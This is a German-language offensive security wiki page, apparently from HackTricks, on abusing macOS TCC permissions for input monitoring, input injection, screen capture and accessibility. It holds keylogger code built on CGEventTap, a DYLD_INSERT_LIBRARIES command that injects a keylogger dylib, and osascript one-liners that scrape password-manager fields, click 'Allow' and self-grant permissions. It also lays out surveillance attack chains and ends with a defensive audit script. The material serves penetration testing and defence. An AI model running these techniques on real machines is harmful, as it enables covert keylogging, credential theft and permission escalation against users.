# Missbrauch von Input Monitoring, Screen Capture & Accessibility unter macOS

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Drei verwandte TCC-Dienste steuern, wie Anwendungen die Desktop-Sitzung des Benutzers beobachten und mit ihr interagieren können:

| TCC Service | Berechtigung | Fähigkeit |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Alle Tastatur- und Mausereignisse systemweit lesen (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Synthetische Tastatur- und Mausereignisse injizieren |
| `kTCCServiceScreenCapture` | **Screen Capture** | Den Display-Puffer lesen, Screenshots erstellen, den Bildschirm aufzeichnen |
| `kTCCServiceAccessibility` | **Accessibility** | Andere Anwendungen über die AXUIElement API steuern und UI-Elemente lesen |

Diese Berechtigungen sind **die gefährlichste Kombination unter macOS** — zusammen ermöglichen sie:
- Vollständiges keylogging jedes Tastendrucks (Passwörter, Nachrichten, Kreditkarten)
- Bildschirmaufzeichnung aller sichtbaren Inhalte
- Injektion synthetischer Eingaben (Schaltflächen anklicken, Dialoge bestätigen)
- Vollständige GUI-Steuerung, die dem physischen Zugriff gleichkommt

---

## Input Monitoring (kTCCServiceListenEvent)

### Funktionsweise

macOS verwendet die **`CGEventTap` API**, damit Prozesse Eingabeereignisse aus dem Quartz-Ereignissystem abfangen können. Ein Prozess mit ListenEvent-Berechtigung kann einen Event-Tap erstellen, der **jedes Tastatur- und Mausereignis** empfängt, bevor oder nachdem es die Zielanwendung erreicht.<sup>[1]</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Binaries mit Entitlements finden
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Angriff: Keylogging via Code Injection

Wenn ein Binary mit der ListenEvent-Berechtigung außerdem **deaktivierte Library-Validierung** aufweist oder **DYLD-Umgebungsvariablen zulässt**, kann ein Angreifer eine Dylib injizieren, die einen CGEventTap registriert:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
Die injizierte dylib erbt die ListenEvent-TCC-Berechtigung des Zielprozesses und zeichnet alle Tastatureingaben auf.

### Attack: Credential Harvesting

Ein ausgefeilter Keylogger kann Tastatureingaben mit der aktiven Anwendung korrelieren:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### Funktionsweise

Die PostEvent-Berechtigung ermöglicht das Erstellen eines Event-Taps mit **`kCGEventTapOptionDefault`** (kann Events ändern/injizieren) anstelle von ListenOnly.<sup>[1]</sup> Dies ermöglicht:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Angriff: Automatisierte TCC-Bestätigungen von Eingabeaufforderungen

Mit PostEvent kann ein Angreifer **das Klicken auf „Allow“** in TCC-Berechtigungsdialogen simulieren:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Bildschirmaufnahme (kTCCServiceScreenCapture)

### Funktionsweise

Die Berechtigung für Bildschirmaufnahmen ermöglicht das Lesen des Display-Puffers über:
- **`CGWindowListCreateImage`** — Aufnahme eines beliebigen Fensters oder des gesamten Bildschirms
- **`ScreenCaptureKit`** (macOS 12.3+) — moderne API zum Streamen von Bildschirminhalten<sup>[3]</sup>
- **`CGDisplayStream`** — hardwarebeschleunigte Bildschirmaufnahme
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Finden von Clients für Bildschirmaufnahmen
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Angriff: Credential Capture via OCR

Ein eingeschleuster Screen-Capture-Prozess kann regelmäßig Frames erfassen und OCR verwenden, um Passwörter zu extrahieren:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> Ab **macOS Sonoma** zeigt die Bildschirmaufnahme ein **dauerhaftes Symbol** in der Menüleiste an. In älteren Versionen konnte die Bildschirmaufzeichnung vollständig unbemerkt bleiben. Eine kurze Aufnahme eines einzelnen Frames kann von Benutzern jedoch weiterhin unbemerkt bleiben.

### Angriff: Sitzungsaufzeichnung

Eine kontinuierliche Bildschirmaufzeichnung ermöglicht eine vollständige Wiedergabe der Sitzung des Benutzers:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Bedienungshilfen (kTCCServiceAccessibility)

### Funktionsweise

Der Zugriff auf Bedienungshilfen gewährt über die **AXUIElement API** Kontrolle über andere Anwendungen.<sup>[2]</sup> Ein Prozess mit Bedienungshilfen-Zugriff kann:

1. **Jedes** UI-Element in jeder Anwendung lesen (Textfelder, Beschriftungen, Schaltflächen, Menüs)
2. Auf Schaltflächen **klicken** und mit Steuerelementen interagieren
3. Text in jedes Textfeld **eingeben**
4. Durch Menüs und Dialoge **navigieren**
5. Angezeigte Daten aus jeder laufenden Anwendung **auslesen**
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Angriff: Self-Granting TCC Permissions

Der gefährlichste Missbrauch von Accessibility besteht darin, **durch die Systemeinstellungen zu navigieren, um der eigenen Malware zusätzliche Berechtigungen zu gewähren**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Angriff: Anwendungsübergreifendes Scraping von Daten
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Angriff: Automatisierte Benutzeraktionen
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Angriffsketten

### Kette: Eingabeüberwachung + Bildschirmaufzeichnung = vollständige Überwachung
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Chain: Accessibility + PostEvent = Vollständige Fernsteuerung
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Kette: Accessibility → Self-Grant Camera/Mic → Überwachung
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Erkennung & Enumeration
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Referenzen

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
